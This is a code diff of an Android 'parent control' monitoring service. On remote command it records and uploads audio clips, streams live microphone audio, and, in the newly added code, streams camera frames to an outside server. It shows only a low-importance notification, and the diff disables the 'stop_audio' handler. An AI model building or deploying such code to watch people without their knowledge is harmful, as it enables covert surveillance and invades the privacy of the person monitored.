@@ -1,33 +1,45 @@
 package com.parentcontrol.app
 
 import android.app.*
+import android.content.Context
 import android.content.Intent
+import android.graphics.ImageFormat
+import android.hardware.camera2.*
 import android.media.AudioFormat
 import android.media.AudioRecord
+import android.media.ImageReader
 import android.media.MediaRecorder
+import android.os.Handler
+import android.os.HandlerThread
 import android.os.IBinder
 import androidx.core.app.NotificationCompat
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.asRequestBody
+import okhttp3.RequestBody.Companion.toRequestBody
+import okio.ByteString.Companion.toByteString
+import java.io.ByteArrayOutputStream
 import java.io.File
-import java.net.URI
 
 class MonitoringService : Service() {
 
     private var audioRecord: AudioRecord? = null
     private val CHANNEL_ID = "monitoring_channel"
     private val SERVER_URL = "https://overflowing-perception-production-17b2.up.railway.app/upload"
-    private val WS_URL = "wss://overflowing-perception-production-17b2.up.railway.app?type=child"
-    private var isRecording = false
+    private val WS_URL = "wss://overflowing-perception-production-17b2.up.railway.app"
     private var isLive = false
-    private var wsClient: okhttp3.WebSocket? = null
+    private var isCameraLive = false
+    private var wsAudio: okhttp3.WebSocket? = null
+    private var wsCamera: okhttp3.WebSocket? = null
     private val SAMPLE_RATE = 16000
     private val BUFFER_SIZE = AudioRecord.getMinBufferSize(
-        SAMPLE_RATE,
-        AudioFormat.CHANNEL_IN_MONO,
-        AudioFormat.ENCODING_PCM_16BIT
+        SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT
     ) * 4
+
+    private var cameraDevice: CameraDevice? = null
+    private var imageReader: ImageReader? = null
+    private var cameraThread: HandlerThread? = null
+    private var cameraHandler: Handler? = null
 
     override fun onCreate() {
         super.onCreate()
@@ -38,9 +50,11 @@ class MonitoringService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         when (intent?.getStringExtra("action")) {
             "start_audio" -> startAudioRecording()
-            "stop_audio" -> stopAudioRecording()
+            "stop_audio" -> {}
             "start_live" -> startLiveStream()
             "stop_live" -> stopLiveStream()
+            "start_camera" -> startCameraStream()
+            "stop_camera" -> stopCameraStream()
         }
         return START_STICKY
     }
@@ -55,13 +69,11 @@ class MonitoringService : Service() {
     }
 
     private fun createNotificationChannel() {
-        val channel = NotificationChannel(
-            CHANNEL_ID, "Monitoring Service", NotificationManager.IMPORTANCE_LOW
-        )
+        val channel = NotificationChannel(CHANNEL_ID, "Monitoring Service", NotificationManager.IMPORTANCE_LOW)
         getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
     }
 
-    // --- RECORDING ---
+    // --- AUDIO RECORDING ---
     private fun startAudioRecording() {
         try {
             val file = File(cacheDir, "audio_${System.currentTimeMillis()}.mp4")
@@ -73,18 +85,12 @@ class MonitoringService : Service() {
                 prepare()
                 start()
             }
-            android.os.Handler(mainLooper).postDelayed({
+            Handler(mainLooper).postDelayed({
                 recorder.stop()
                 recorder.release()
                 uploadFile(file)
             }, 30000)
-        } catch (e: Exception) {
-            e.printStackTrace()
-        }
-    }
-
-    private fun stopAudioRecording() {
-        isRecording = false
+        } catch (e: Exception) { e.printStackTrace() }
     }
 
     private fun uploadFile(file: File) {
@@ -95,46 +101,40 @@ class MonitoringService : Service() {
                     .setType(MultipartBody.FORM)
                     .addFormDataPart("file", file.name, file.asRequestBody("audio/mp4".toMediaType()))
                     .build()
-                val request = Request.Builder().url(SERVER_URL).post(body).build()
-                client.newCall(request).execute()
+                OkHttpClient().newCall(Request.Builder().url(SERVER_URL).post(body).build()).execute()
                 file.delete()
-            } catch (e: Exception) {
-                e.printStackTrace()
-            }
+            } catch (e: Exception) { e.printStackTrace() }
         }.start()
     }
 
-    // --- LIVE STREAM ---
+    // --- LIVE AUDIO ---
     private fun startLiveStream() {
         isLive = true
         val client = OkHttpClient()
-        val request = Request.Builder().url(WS_URL).build()
-        wsClient = client.newWebSocket(request, object : WebSocketListener() {
-            override fun onOpen(webSocket: okhttp3.WebSocket, response: Response) {
-                streamMicToWebSocket(webSocket)
+        wsAudio = client.newWebSocket(
+            Request.Builder().url("$WS_URL?type=child").build(),
+            object : WebSocketListener() {
+                override fun onOpen(webSocket: okhttp3.WebSocket, response: Response) {
+                    streamMicToWebSocket(webSocket)
+                }
+                override fun onFailure(webSocket: okhttp3.WebSocket, t: Throwable, response: Response?) {
+                    isLive = false
+                }
             }
-            override fun onFailure(webSocket: okhttp3.WebSocket, t: Throwable, response: Response?) {
-                isLive = false
-            }
-        })
+        )
     }
 
     private fun streamMicToWebSocket(webSocket: okhttp3.WebSocket) {
         Thread {
             audioRecord = AudioRecord(
-                MediaRecorder.AudioSource.MIC,
-                SAMPLE_RATE,
-                AudioFormat.CHANNEL_IN_MONO,
-                AudioFormat.ENCODING_PCM_16BIT,
-                BUFFER_SIZE
+                MediaRecorder.AudioSource.MIC, SAMPLE_RATE,
+                AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, BUFFER_SIZE
             )
             audioRecord?.startRecording()
             val buffer = ByteArray(BUFFER_SIZE)
             while (isLive) {
                 val read = audioRecord?.read(buffer, 0, buffer.size) ?: 0
-                if (read > 0) {
-                    webSocket.send(okio.ByteString.of(*buffer.copyOf(read)))
-                }
+                if (read > 0) webSocket.send(buffer.copyOf(read).toByteString())
             }
             audioRecord?.stop()
             audioRecord?.release()
@@ -144,8 +144,72 @@ class MonitoringService : Service() {
 
     private fun stopLiveStream() {
         isLive = false
-        wsClient?.close(1000, "Stop")
-        wsClient = null
+        wsAudio?.close(1000, "Stop")
+        wsAudio = null
+    }
+
+    // --- CAMERA STREAM ---
+    private fun startCameraStream() {
+        isCameraLive = true
+        cameraThread = HandlerThread("CameraThread").also { it.start() }
+        cameraHandler = Handler(cameraThread!!.looper)
+
+        val client = OkHttpClient()
+        wsCamera = client.newWebSocket(
+            Request.Builder().url("$WS_URL?type=camera").build(),
+            object : WebSocketListener() {
+                override fun onOpen(webSocket: okhttp3.WebSocket, response: Response) {
+                    openCamera(webSocket)
+                }
+                override fun onFailure(webSocket: okhttp3.WebSocket, t: Throwable, response: Response?) {
+                    isCameraLive = false
+                }
+            }
+        )
+    }
+
+    private fun openCamera(webSocket: okhttp3.WebSocket) {
+        val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+        val cameraId = cameraManager.cameraIdList[0]
+
+        imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2)
+        imageReader?.setOnImageAvailableListener({ reader ->
+            val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
+            val buffer = image.planes[0].buffer
+            val bytes = ByteArray(buffer.remaining())
+            buffer.get(bytes)
+            image.close()
+            if (isCameraLive) webSocket.send(bytes.toByteString())
+        }, cameraHandler)
+
+        cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
+            override fun onOpened(camera: CameraDevice) {
+                cameraDevice = camera
+                val surface = imageReader!!.surface
+                camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
+                    override fun onConfigured(session: CameraCaptureSession) {
+                        val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
+                            addTarget(surface)
+                        }.build()
+                        session.setRepeatingRequest(request, null, cameraHandler)
+                    }
+                    override fun onConfigureFailed(session: CameraCaptureSession) {}
+                }, cameraHandler)
+            }
+            override fun onDisconnected(camera: CameraDevice) { camera.close() }
+            override fun onError(camera: CameraDevice, error: Int) { camera.close() }
+        }, cameraHandler)
+    }
+
+    private fun stopCameraStream() {
+        isCameraLive = false
+        cameraDevice?.close()
+        cameraDevice = null
+        imageReader?.close()
+        imageReader = null
+        cameraThread?.quitSafely()
+        wsCamera?.close(1000, "Stop")
+        wsCamera = null
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
